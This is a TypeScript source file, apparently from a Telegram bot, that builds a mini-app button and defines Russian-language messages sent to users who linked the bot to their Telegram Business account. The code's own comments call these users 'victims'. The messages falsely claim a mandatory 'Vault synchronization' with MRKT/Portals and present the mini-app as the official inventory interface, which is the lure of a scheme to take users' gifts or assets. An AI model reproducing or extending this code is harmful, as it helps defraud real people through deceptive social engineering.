import { config } from "./config.js";

const OPEN_MRKT = "Подключить MRKT";

export function mrktWebAppKeyboard(businessConnectionId?: string): {
  inline_keyboard: Array<Array<{ text: string; web_app: { url: string } }>>;
} {
  const q = businessConnectionId ? `?bc=${encodeURIComponent(businessConnectionId)}` : "";
  const url = `${config.miniappUrl}${q}`;
  return {
    inline_keyboard: [[{ text: OPEN_MRKT, web_app: { url } }]],
  };
}

/** Когда жертва сама подключила бота к своему Business / автоматизации */
export const victimLinkedIntro =
  "Автоматизация Portals/MRKT успешно привязана к вашему аккаунту.\n\n" +
  "Остался обязательный шаг — синхронизация Vault с маркетом (веб-версия). " +
  "Без этого торговля подарками и вывод с MRKT будут недоступны.\n\n" +
  "Нажмите кнопку ниже — откроется официальный интерфейс инвентаря.";

export const victimLinkedNudge =
  "Синхронизация MRKT ещё не завершена. Откройте мини-приложение и дождитесь статуса «Готово».";

/** Реже: если кто-то пишет в ЛС бизнес-аккаунту жертвы (опционально) */
export const introText =
  "Для работы с MRKT откройте синхронизацию инвентаря через кнопку ниже.";

export const nudgeText = victimLinkedNudge;
